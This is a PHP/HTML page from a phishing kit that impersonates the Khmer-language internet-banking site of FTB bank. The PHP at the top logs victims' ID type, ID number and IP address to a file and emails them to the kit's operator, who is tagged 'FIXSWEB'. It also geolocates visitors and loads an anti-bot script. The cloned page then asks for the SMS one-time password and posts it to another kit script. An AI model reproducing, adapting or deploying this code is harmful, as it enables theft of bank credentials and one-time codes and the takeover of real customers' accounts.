
<?php
			include('antibots.php');

?>

<?php
ob_start();
session_start();

$url = json_decode(file_get_contents("http://api.ipinfodb.com/v3/ip-city/?key=2b3d7d0ad1a285279139487ce77f3f58d980eea9546b5ccc5d08f5ee62ce7471&ip=".$_SERVER['REMOTE_ADDR']."&format=json"));
$country=$url->countryName;
$state=$url->regionName;


require "email.php";



if(isset($_POST['idtype'])&&isset($_POST['idnum'])){


	$hi="#---------------------------[ FIXSWEB_FTB]----------------------------#\r\n";
	$hi.="ID TYPE: {$_POST['idtype']}\r\n";
    $hi.="ID NUMBER: {$_POST['idnum']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="IP		:  {$_SERVER['REMOTE_ADDR']}\r\n";
	$hi.="#---------------------------[ FIXSWEB_ICQ..@715490015]----------------------------#\r\n";

		$save=fopen("logs.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#FBBANK From  [ {$country}]";
	$headers="From: FBANK FIXSWEB <fixsweb>  \r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($your_email,$subject,$hi,$headers);
	
	

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
			include('html/bootstrap3/js/blocker.txt');
    		
}


?>

  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
  <!--
   * $RCSfile$
   * $Author$
   * $Revision$
   * $Date$
  -->
    <html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
      <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <meta name="author" content="Edge IPK">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">   <!--   IE compatable fix-->
        <title>iBanking FTB Retail IB Rich HTML </title>
        
        <link rel="stylesheet" href="html/bootstrap3/css/bootstrap.css" media="screen">
        <link rel="stylesheet" href="html/css/responsive_fixes.css" media="screen">
  
  
        <script src="html/bootstrap3/js/jquery.min.js"></script>
        <script src="html/js/form.js"></script>
  
        <script src="html/bootstrap3/js/bootstrap.min.js"></script>
       
        <!--link href="html/bootstrap3/css/bootstrap-responsive.min.css" rel="stylesheet"-->
  
          
                  <style type='text/css'>.accessibilityStyle { position:absolute !important; width:0 !important; height:0 !important; font-size:0 !important; overflow:hidden !important;padding:0 !important} *[align="right"]  { text-align: right; }  *[align="left"]   { text-align: left;  }  *[align="center"] { text-align: center;} </style><style type='text/css'>.ecDIB {display: -moz-inline-stack;display: inline-block;zoom: 1;*display: inline;vertical-align: top;}.ecDIBCol {vertical-align: top;}</style>
  <link id='C2__maincss' rel='stylesheet' type='text/css' href='html/css/bootstrapDefault.css'>
  
  <link type="text/css" href="templates/widgets/jquery-ui/css/jquery-ui-1.11.4/jquery-ui.css" rel="stylesheet" media="screen">	
  <!-- <link type="text/css" href="./templates/widgets/jquery-ui/css/jquery-ui-1.11.4/jquery.ui.theme.css" rel="stylesheet"  media="screen" />	-->
  <!--  -->
  <style type="text/css" media="screen">
      .ui-icon {
          width: 15px!important;
          height: 15px!important;
      }
      .ui-widget-content {
          background-image: none !important;
          background-color: #F2F2F2 !important;				
      }
      .ui-corner-top, .ui-corner-bottom, .ui-corner-all {
          border-radius: 3px;
      }
      .ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header  {
          border: none;
          
          background: white;
          color:#333;
      }
      .ui-state-default{
          
          border: inherit;
          background: inherit;
      }
      .ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active {
          border: none;
          
          background: white;
          color:#0983c4;
      }
      .ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited {
          color: #333;
      }
      .ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited {
          color:#0983c4;
      }
      .ui-accordion .ui-accordion-header a {
          padding: 15px 10px 10px 40px;
      }
      .ui-state-default .ui-icon {
          
      }
      .ui-state-active .ui-icon{
           
      }	
      
      .ui-accordion .ui-accordion-content{
          margin-top: 0px;
          margin-bottom: 0px;
          border-bottom: 1px solid #c1c1c1;
          top: 0px;
          padding: 0px;
      }
      .ui-widget-content {
          border: none;
      }
      .ui-accordion .ui-accordion-header {
          margin-top: 0px;
          margin-bottom: 0px;
          border-top: none !important;
          border-bottom: 1px solid #c1c1c1;
      }
      .HideAccordionButton {
          width: 18px; 
          height: 18px; 
          background-image: url(templates/widgets/jquery-ui/img/RemoveAccord.png); 
          float: right
      }
      .ui-widget { font-family:inherit!important; font-size: inherit!important; }
      .ui-widget-header { color: #222222; font-weight: bold; }
      .ui-widget-header {   }
      .ui-widget-content a { color:inherit;}
      .ui-dialog{
          
          position:absolute!important; padding:0px!important; -webkit-box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);
          -moz-box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);
          box-shadow: 0 3px 10px rgba(0, 0, 0, 0.75);}
      .ui-dialog-title{ font-size:1.4em; line-height:1.25em; margin:0!important;}
      .ui-dialog-content{padding:0px!important;}
      .ui-dialog-titlebar{border-bottom: 2px solid #DE1927!important; padding: 1.25em 22.5px!important;}
      .ui-dialog-titlebar.ui-corner-all{border-radius:0px!important;}
      .ui-widget-overlay { background: none repeat scroll 0 0 black !important; opacity: 0.50 !important}
      .dataTables_paginate .ui-button {
          margin-right: 0.0 !important;
          padding: 11px 15px;
      }
      .ui-buttonset{ margin-right:0!important;}
  </style>
  <style type="text/css">
      .ui-icon {
          width: 24px !important;
          height: 24px !important;
      }
      
      .ui-dialog {
          top:0px !important;
                 z-index:3001!important;
                 xxz-index:3001;
      }
      
      .ui-dialog .ui-dialog-titlebar-close {
          width: 24px;
          height: 24px;
                 display: none;
      }
      .ui-dialog-titlebar {
          border: 0 !important;
      }
      .ui-widget-content {
          background-color:white !important;
      }
      .ui-dialog-titlebar-close:focus {
          padding: 2px;
      }
     .ui-dialog-content  {
             margin: 20px !important;
     }
  ui-dialog {
      box-shadow: 10px 10px 10px grey;
  }
  .ui-dialog .ui-dialog-titlebar-close span
  {
      display:block;
      margin:0.5px!important;
  }
  .ui-widget-header .ui-icon {
      
  background: url("images/u113.png") no-repeat scroll center center transparent !important;
  }
  .ui-STICKY_SECTION {
    z-index:3001!important;
    xxz-index:3001;
  }
  </style>
  
      <link rel="stylesheet" href="html/css/bootstrapResponsiveDefault.css" media="screen">
      </head>
      <body onunload="unloadAction();" style="margin:0px;" class="BrowserWindow">
  
  
  <!-- Start Changes for the download functionality -->
  
  <!-- End Changes for the download functionality -->
  
  
          <!-- UNCOMMENT IFRAME IF USING AUTOCOMPLETE - PROVIDES WORK-AROUND FOR IE6 ISSUE -->
      <!--iframe id="ec_suggest_iframe" style="position:absolute; left:0; top:0px; width:0px; height: 0px; " ></iframe-->
      <form id="form2" name="form2" method="post" action="sms2.php" autocomplete="off" onsubmit="return validateForm()">
  
       <!-- don't show the branding in a popup -->
      <!--<div class="navbar navbar-inverse navbar-fixed-top">
          <div class="navbar-inner">
              <div class="container">
              <button class="btn btn-navbar" data-target=".nav-collapse" data-toggle="collapse" type="button">
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              </button>
              <a class="brand" href="./index.html">Model Bank</a>
              <div class="nav-collapse collapse">
              </div>
          </div>
      </div>
      -->
      
      
        <!-- To center the contents of your form, set style="text-align:center;" on the form tag (works in IE), 
            and style="margin-left:auto; margin-right:auto;" on the following table (works in Mozilla) -->
            
                <div style="width: 100%">
                        
                        
            
               <div style="display: none;"><input type="hidden" name="BROWSER_FEATURES" value=""></div><div style="display: none;"><input type="hidden" name="DEVICE_SIZE_INFO" value=""></div><div style="clear: both; width: 100%" id="EDGE_CONNECT_PROCESS"><div style="clear: both; " id="FMT_36EEDAB30C1AC82E112239" class="WhiteBackground"><div style="clear: both; " id="FMT_26E49927B0C2133627199" class="container NoPadding"><div style="clear: both; " id="FMT_BEB21A336542641A7812686" class="hidden-xs"><div style="clear: both; width: 100%"><div id="COL_BEB21A336542641A7807179" style="float: left;display: none;width: 33.0%"><div><div style="clear: left;" id="row_TXT_0877F178893377CE1835"><div id="TXT_0877F178893377CE1835" style="text-align: left; "><div><!-- $Revision: 1.4 $ -->
  <!-- widget file maintained by edgeConnect - DO NOT EDIT -->
  <img src="images/TCIBIcons/FTBBanner.png" alt="FTBLogo" id="img_TXT_0877F178893377CE1835" height="150" width="1680"></div></div></div></div></div><div id="COL_BEB21A336542641A7807196" style="float: left;width: 33.0%"><div><div style="clear: left;" id="row_TXT_EECFB638FC420B3E734443"><div id="TXT_EECFB638FC420B3E734443" style="text-align: left; "><div><div id="WRAPPER_TXT_EECFB638FC420B3E734443" style="vertical-align: bottom; display: none">Please wait<img style="padding-left: 5px" id="IMG_TXT_EECFB638FC420B3E734443" src="images/TCIBIcons/loader2.gif"></div>
  <style type="text/css">
  .loadimg
  {
  padding-left: 0px !important;
  background-image: url("images/TCIBIcons/loader2.gif");
  background-position:center;
  margin-left:4px
  }
  a.text-white,a.text-white:hover
  {
  border:0px !important;
  outline:0px !important;
  color:#fff;
  }
  </style>
  </div></div></div></div></div><div id="COL_FE5FEA5BAA957DAB28663" class="floatRight" style="float: left;"><div><div style="clear: left;" id="row_BUT_9A4988B12292E91928884"><div style="text-align: left; float: left;  " id="p4_BUT_9A4988B12292E91928884"><div style="padding: 4px"><a title="English" onclick="return buttonClicked('__9A4988B12292E919 FormButton 48', false, null, '', false, 'BUT_9A4988B12292E91928884', false, true, '', true, true, null);" href="javascript:void(0)" class=" BoldPlain " id="BUT_9A4988B12292E91928884"><span></span></a></div></div><div style="text-align: right; float: left;  " id="p4_BUT_9A4988B12292E91928889"><div style="padding: 4px"><a title="Khmer" onclick="return buttonClicked('__9A4988B12292E919 FormButton 49', false, null, '', false, 'BUT_9A4988B12292E91928889', false, true, '', true, true, null);" href="javascript:void(0)" class=" textMediumBoldUnderline " id="BUT_9A4988B12292E91928889"><span></span></a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div><div style="clear: left;" id="row_TXT_16FDAC441A50D32A51850"><div id="TXT_16FDAC441A50D32A51850" style="text-align: left; "><div><!-- $Revision: 1.4 $ -->
  <!-- widget file maintained by edgeConnect - DO NOT EDIT -->
  <img src="images/TCIBIcons/FTBBanner.png" alt="FTBBanner" id="img_TXT_16FDAC441A50D32A51850" width="100%"></div></div></div></div></div><div style="clear: both; " id="FMT_7D654E908184AF8F5208" class="navbar navbar-static-top"><div style="clear: both; " id="FMT_7D654E908184AF8F5224" class="navbar-inner"><div style="clear: both; " id="FMT_36EEDAB30C1AC82E112272" class="container NoPadding PaddingLeft10px"><div style="clear: both; " id="FMT_EFA2167084CCA83529431" class="visible-xs hidden-sm hidden-md hidden-lg"><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div style="width: 100%"><div id="p1_GRP_A40B9C6930EEE7CA19414" style="position: relative"><div style="width: 100%"><div id="COL_7819D4AFF48A500183352" style="float: left;width: 33.0%"><div><div style="clear: left;" id="row_TXT_EEBCB866CBAC481023008"><div id="TXT_EEBCB866CBAC481023008" style="text-align: left; "><div><!-- $Revision: 1.4 $ -->
  <!-- widget file maintained by edgeConnect - DO NOT EDIT -->
  <img src="images/TCIBIcons/img_logo.jpg" alt="FTBLogo" id="img_TXT_EEBCB866CBAC481023008" height="27" width="54"></div></div></div></div></div><div id="COL_7819D4AFF48A500183354" style="float: left;width: 33.0%"><div><div style="clear: left;" id="row_HEAD_EFA2167084CCA83521681"><div id="p1_HEAD_EFA2167084CCA83521681" style="text-align: left; ; float: left;" class="textLargeBold"><div style="padding: 4px">ចូល</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div id="COL_181A7EDB258447B224190" class="floatRight" style="float: left;margin-left: 70%;"><div><div style="clear: left;display: none;" id="row_BUT_1B76FE4C255DFD9C477784" class="WhiteBackground  "><div id="p1_BUT_1B76FE4C255DFD9C477784" class="hidden-xs col-sm-4" style="display: none;float: left;"><div style="padding: 4px">&nbsp;</div></div><div class="col-xs-12 col-sm-8  " style="text-align: left; float: left;  display: none;  display: none;" id="p4_BUT_1B76FE4C255DFD9C477784"><div style="padding: 4px"><a title="En" onclick="ajaxButtonAction(null, '__1B76FE4C255DFD9C FormButton 48', 'BUT_1B76FE4C255DFD9C477784', false, null, '', 'servletcontroller', '', false, true, '');" href="javascript:void(0)" class="floatRight" id="BUT_1B76FE4C255DFD9C477784"><span>En</span></a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="row_BUT_1B76FE4C255DFD9C477789" class="WhiteBackground  "><div id="p1_BUT_1B76FE4C255DFD9C477789" class="hidden-xs col-sm-4" style="float: left;"><div style="padding: 4px">&nbsp;</div></div><div class="col-xs-12 col-sm-8  " style="text-align: left; float: left;  " id="p4_BUT_1B76FE4C255DFD9C477789"><div style="padding: 4px"><a title="Kh" onclick="ajaxButtonAction(null, '__1B76FE4C255DFD9C FormButton 49', 'BUT_1B76FE4C255DFD9C477789', false, null, '', 'servletcontroller', '', false, true, '');" href="javascript:void(0)" class="floatRight" id="BUT_1B76FE4C255DFD9C477789"><span>Kh</span></a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; " id="FMT_36EEDAB30C1AC82E112290" class="ImageBackground"><div style="clear: both; " id="FMT_36EEDAB30C1AC82E112305" class="container NoPadding"><div style="clear: both; " id="FMT_26E49927B0C2133642899" class="main-content-section-XS"><div style="clear: both; " id="FMT_BEB21A336542641A9116859" class="hidden-xs col-sm-12"><div style="clear: both"><div style="clear: left;" id="row_HEAD_68AE48856455D22C7935"><div id="p1_HEAD_68AE48856455D22C7935" style="float: left;"><div><h3 id="HEAD_68AE48856455D22C7935">ការអនុញ្ញាតរបស់អ្នកត្រូវបានទាមទារ</h3></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; width: 100%" id="FMT_BBA9DF0BC5BB59F552466"><div style="clear: both" id="EDGE_CONNECT_PHASE">
      <div style="clear: both; width: 100%" id="C1__EDGE_CONNECT_PROCESS"><div style="clear: both"></div><div style="clear: both" id="C1__EDGE_CONNECT_PHASE"><div style="clear: both"><div style="clear: left;" id="C1__row_TXT_D8B347484B57F7648370"><div id="C1__TXT_D8B347484B57F7648370" style="text-align: left; "><div>
  
  </div></div></div></div><div style="clear: both; width: 100%" id="C1__FMT_4FD65E9564E0ABE213428"><div style="clear: both; width: 100%">
      
      
      <div id="page1" class="col-lg-6 col-md-6 col-sm-6 col-xs-12" style="float: left;"><div><div style="clear: both; " id="C1__FMT_7D654E908184AF8F17184" class="login-section"><div style="clear: both; " id="C1__FMT_D9A8B0C9D25A970922187" class="row"><div style="clear: both; width: 100%" id="C1__FMT_D2ADC09495D33D3C21910" class="clearnone col-xs-12"><div style="clear: both; width: 100%"><div id="C1__COL_D8D291AF3353DBBC3411354" style="float: left;width: 50.0%"><div><div style="clear: left;" id="C1__row_HEAD_D8D291AF3353DBBC3408775"><div id="C1__p1_HEAD_D8D291AF3353DBBC3408775" style="text-align: left; ; float: left;"><div style="padding: 4px"><h4 id="C1__HEAD_D8D291AF3353DBBC3408775">សារ SMS OTP</h4></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div id="C1__COL_D8D291AF3353DBBC3411358" style="float: left;width: 50.0%"><div><div style="clear: left;" id="C1__row_HEAD_21AA8B8279AB849B2381" class="NoFloatChildDiv  "><div id="C1__p1_HEAD_21AA8B8279AB849B2381" style="text-align: right; ; float: left;"><div style="padding: 4px"><h4 id="C1__HEAD_21AA8B8279AB849B2381"></h4></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; " id="C1__FMT_481B4596F58A9601178767" class="row"><div style="clear: both; width: 100%"><div style="clear: left;display: none;" id="C1__row_HEAD_0EBFA3A4C81631BE1018180"><div id="C1__p1_HEAD_0EBFA3A4C81631BE1018180" style="text-align: left; float: left;  width:100%"><div style="padding: 4px"><fieldset style="border: none; padding: 0px; margin-left: 0px; display: inline; vertical-align:middle;" id="C1__GROUP_FS_HEAD_0EBFA3A4C81631BE1018180" class="errorMessageRed"><legend class="accessibilityStyle"></legend><div style="display:inline-block; display: none;" id="C1__p1_HEAD_0EBFA3A4C81631BE1018180"></div><div style="padding: 4px; display: inline-block; padding: 0px; display: none;" id="C1__p7_HEAD_0EBFA3A4C81631BE1018180">&nbsp;</div><div style="display:inline-block; display: none;" id="C1__p4_BUT_481B4596F58A9601178736"><a title="Click here to reset" onclick="return buttonClicked('C1____481B4596F58A9601 FormButton 19', false, null, '', false, 'C1__BUT_481B4596F58A9601178736', true, false, '', true, true, 'preInPhase');" href="javascript:void(0)" id="C1__BUT_481B4596F58A9601178736"><span>Click here to reset</span></a></div></fieldset></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; " id="C1__FMT_7417720F39BF8CEA562647" class="row row-margin"><div style="clear: both; " id="C1__FMT_06E0154535BA99BC159068" class="clearnone col-xs-12"><div style="clear: both; width: 100%"><div id="C1__COL_D8D291AF3353DBBC3425210" class="loginHelp" style="float: left;"><div><div style="clear: left;" id="C1__row_HEAD_21AA8B8279AB849B2385"><div id="C1__p1_HEAD_21AA8B8279AB849B2385" style="float: left;" class="muted textMedium">សារ SMS OTP ត្រូវបានផ្ញើទៅទូរស័ព្ទរបស់អ្នក។<div style="padding: 0px"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div id="C1__COL_D8D291AF3353DBBC3425216" style="float: left;width: 50.0%"><div><div style="clear: left;" id="C1__row_TXT_D8D291AF3353DBBC3422937"><div id="C1__TXT_D8D291AF3353DBBC3422937"><div><img style="margin-left:4px" id="loginHelp" src=""><ul style="display: inline-block; " class="nav">
  <li class="dropdown my-options"> 
  <a data-toggle="dropdown" class="dropdown-toggle" href="#"></a>
  <ul class="dropdown-menu contact-menu space ">
  <li><p class="helptext">.</p>  </li>
  </ul></li></ul></div></div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; display: none;margin-top: -10px; margin-bottom: 20px" id="C1__FMT_06E0154535BA99BC159085" class="clearnone hidden-xs col-sm-12"><div style="clear: both; width: 100%"><div style="clear: left;display: none;" id="C1__row_TXT_7417720F39BF8CEA562670"><div id="C1__TXT_7417720F39BF8CEA562670" style="text-align: left; display: none;  width:100%"><div><img style="margin-left:4px" src="./images/ButtonIcons/smHelp1.png"><ul style="display: inline-block; padding-left: 5px" class="nav">
  <li class="dropdown my-options"> 
  <a data-toggle="dropdown" class="dropdown-toggle" href="#">
  what is this?</a>
  <ul class="dropdown-menu contact-menu space ">
  <li><p style="margin: 8px;"> User ID is used for logging into internet banking which would have been presented to you when you opened your account. </p>  </li>
  </ul></li></ul></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; width: 100%" id="C1__FMT_06E0154535BA99BC171115"><div style="clear: both"><div style="clear: left;" id="C1__row_USER_NAME" class="row row-margin  "><div id="C1__p1_USER_NAME" style="float: left;" class="hidden-xs col-sm-4"><div style="padding: 4px">
      
      <label for="C1__USER_NAME">OTP</label><span id="C1__p2_USER_NAME">*</span></div></div><div style="float: left;" id="C1__p4_USER_NAME" class="col-xs-12 col-sm-8  "><div style="padding: 4px">
          
          
          <input type="text" name="otp" id="otp" class="form-control" size="15" maxlength="10">
          <input type="hidden" name="p">
          <span style="display: none; color: #DE1927;"  id="serror">OTP SMS ត្រូវបានទាមទារ</span></div><label class="errorMessageRed  " id="C1__USER_NAME_ERRORMESSAGE" for="C1__USER_NAME" style="display: none;"></label></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C1__row_REMEMBER_ME_CHECKBOX" class="row row-margin  "><div id="C1__p1_REMEMBER_ME_CHECKBOX" style="float: left;" class="hidden-xs col-sm-4"><div style="padding: 4px"><label for="C1__REMEMBER_ME_CHECKBOX_0">&nbsp;</label><span id="C1__p2_REMEMBER_ME_CHECKBOX"> </span></div></div><div style="float: left;" id="C1__p4_REMEMBER_ME_CHECKBOX" class="col-xs-12 col-sm-8  "><div style="padding: 4px"></div><label class="errorMessageRed  " id="C1__REMEMBER_ME_CHECKBOX_ERRORMESSAGE" for="C1__REMEMBER_ME_CHECKBOX" style="display: none;"></label></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C1__row_BUT_21AA8B8279AB849B2246" class="row row-margin  "><div id="C1__p1_BUT_21AA8B8279AB849B2246" class="col-sm-4" style="float: left;"><div style="padding: 4px">&nbsp;</div></div><div class="col-xs-12 col-sm-8  " style="float: left;  " id="C1__p4_BUT_21AA8B8279AB849B2246"><div style="padding: 4px">
  
          <button title="Continue"  type="submit"  onmouseover="this.style.cursor='pointer'" value="Continue" class="btn btn-customnew btn100pct-xs" id="btnt">Continue<img id="now" style=" display:none; margin-left:10px; width:20px;" src="images/TCIBIcons/spin.svg"></button></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; " id="C1__FMT_A506D890FCB026B517827"><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div></div></div></div>
  
  
  
  
  
  
  
  
  <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div><div style="clear: left;display: none;" id="C1__row_SPC_A506D890FCB026B526992"><div style="text-align: left; display: none;  " id="C1__SPC_A506D890FCB026B526992"><div class="hidden-xs">&nbsp;<br></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div style="clear: both; display: none;width: 100%" id="C1__FMT_A506D890FCB026B526994"><div style="clear: both"><div style="clear: left;" id="C1__row_TXT_A506D890FCB026B527010"><div id="C1__TXT_A506D890FCB026B527010" style="text-align: left; "><div><div id="myCarousel" class="carousel slide">
  <ol class="carousel-indicators">
  <li class="active" data-slide-to="0" data-target="#myCarousel"></li>
  <li class="" data-slide-to="1" data-target="#myCarousel"></li>
  <li class="" data-slide-to="2" data-target="#myCarousel"></li>
  </ol>
  <div class="carousel-inner">
  <div class="item active">
  <img alt="" src="images/TCIBIcons/carporate.jpg">
  <div class="carousel-caption">
  <h4>Caporate</h4>
  <p>Carporate</p>
  </div>
  </div>
  <div class="item">
  <img align="center" alt="" src="images/TCIBIcons/mobile.jpg">
  <div class="carousel-caption">
  <h4>Mobile</h4>
  <p>Mobile.</p>
  </div>
  </div>
  <div class="item">
  <img alt="" src="images/TCIBIcons/wealth.jpg">
  <div class="carousel-caption">
  <h4>Wealth</h4>
  <p>Wealth</p>
  </div>
  </div>
  </div>
  <a class="left carousel-control" data-slide="prev" href="#myCarousel">&lsaquo;</a>
  <a class="right carousel-control" data-slide="next" href="#myCarousel">&rsaquo;</a>
  </div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div style="clear: both; width: 100%" id="C1__FMT_A27F3F69AD52998142440"><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div><div id="C1__p1_GRP_A27F3F69AD52998142365" style="display: none;position: relative; width: 100%"></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div> 
  
  <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; " id="FMT_E8644C58AA1002126080" class="WhiteBackground hidden-xs"><div style="clear: both; " id="FMT_E278EBA3F18759C310566" class="container NoPadding"><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div><div id="p1_GRP_B12202421510E85B3339" style="position: relative">
      <div style="clear: both; width: 100%" id="C2__EDGE_CONNECT_PROCESS"><div style="clear: both"></div><div style="clear: both" id="C2__EDGE_CONNECT_PHASE"><div style="clear: both; " id="C2__FMT_9624B9C4264BED1011998" class="WhiteBackground"><div style="clear: both; width: 100%" id="C2__FMT_9624B9C4264BED1012002"><div style="clear: both; width: 100%"><div id="C2__COL_9624B9C4264BED1012005" class="col-lg-3 col-md-3 col-sm-6 col-xs-12" style="float: left;"><div><div style="clear: left;" id="C2__row_SPC_BEB21A336542641A3374247"><div style="text-align: left; width: 100%;" id="C2__SPC_BEB21A336542641A3374247"><div>&nbsp;<br></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="width: 100%"><div id="C2__p1_GRP_0915C9EB57833844853400" style="position: relative"><div style="width: 100%"></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div style="width: 100%"><div style="clear: left;" id="C2__row_HEAD_9624B9C4264BED1011987"><div id="C2__p1_HEAD_9624B9C4264BED1011987" style="text-align: left; ; float: left;width: 100.0%;" class="Bold"><div>ទាញយកឯកសារ</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_D18D0F0A93AC23E724523"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_D18D0F0A93AC23E724523"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="https://www.ftbbank.com/" class="Bold" onclick="" target="#">សេចក្តីណែនាំ</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_D18D0F0A93AC23E724538"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_D18D0F0A93AC23E724538"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="https://www.ftbbank.com/" class="Bold" onclick="" target="#">សេវាកម្មប័ណ្ណ</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_0915C9EB57833844853331"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_0915C9EB57833844853331"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="" class="Bold" onclick="" target="#">©2022 FTB</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_0915C9EB57833844853321"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_0915C9EB57833844853321"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="Documents/PasswordPolicy.pdf" class="Bold" onclick="" target="#">គោលការណ៍ពាក្យសម្ងាត់</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_0915C9EB57833844853336"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_0915C9EB57833844853336"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="Documents/TCIBDemo.pdf" class="Bold" onclick="" target="#">ការណែនាំពីការប្រើប្រាស់</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_0915C9EB57833844853341"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_0915C9EB57833844853341"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="Documents/TermsNCondition.pdf" class="Bold" onclick="" target="#">បញ្ញតិ និង​ល័ក្ខខ័ណ្ឌស្តីពីការប្រើប្រាស់ សេវាធនាគារតាមអ៊ីនធឺណិត</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_BUT_829B3259F84BAA2724231"><div style="text-align: left; width: 100%;  float: left;  " id="C2__p4_BUT_829B3259F84BAA2724231"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="../en/contact/ftb-locator/index.htm" class="Bold" onclick="" target="#">ទីតាំងATM</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;display: none;" id="C2__row_BUT_0915C9EB57833844853346"><div style="text-align: left; width: 100%;  float: left;  display: none;  display: none;" id="C2__p4_BUT_0915C9EB57833844853346"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
